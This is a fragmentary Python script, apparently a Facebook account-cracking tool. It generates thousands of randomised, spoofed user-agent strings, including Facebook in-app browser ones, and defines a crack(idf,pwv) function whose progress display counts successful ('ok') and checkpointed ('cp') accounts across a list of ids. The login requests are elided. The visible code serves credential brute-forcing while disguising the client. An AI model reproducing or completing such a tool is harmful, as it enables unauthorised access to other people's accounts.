...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 6.0;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='NT 6.1; Win64; x64)'
	e=random.randrange(100, 9999)
	f='Lenovo TAB 2 A10-70F)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Safari/537.36'
	...
	c='ONEPLUS 6T Build/PQ2A.190405.003; wv)'
	...
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/225.0.0.47.118;]'
...
for x in range(10):
	...
	l='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/71.3.3718.67322'
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rSPEED {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
